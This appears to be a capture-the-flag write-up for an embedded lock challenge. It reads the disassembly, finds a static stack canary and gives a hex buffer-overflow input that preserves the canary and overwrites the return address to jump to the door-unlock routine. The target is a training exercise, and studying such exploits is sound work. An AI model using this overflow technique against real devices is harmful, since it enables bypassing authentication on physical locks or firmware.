## Challenge Overview

```
OVERVIEW

    - A firmware update rejects passwords which are too long.
    - This lock is attached the the LockIT Pro HSM-1.
```

## Solution
Looking at the assembly it seems there is a static canary after the input buffer:
```
4566:  b012 4644      call	#0x4446 <unlock_door>
---
4578:  f190 8600 1100 cmp.b	#0x86, 0x11(sp)
457e:  0624           jz	$+0xe <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.",
---
458c:  3150 1200      add	#0x12, sp
```

To get around this we can just add it to the buffer:

| padding | canary |  srp |

So:
`0x41*17+0x86 + 0x4644`

trying this:
```
4141414141414141414141414141414141864644
```

The works!

Nice intro to canaries.
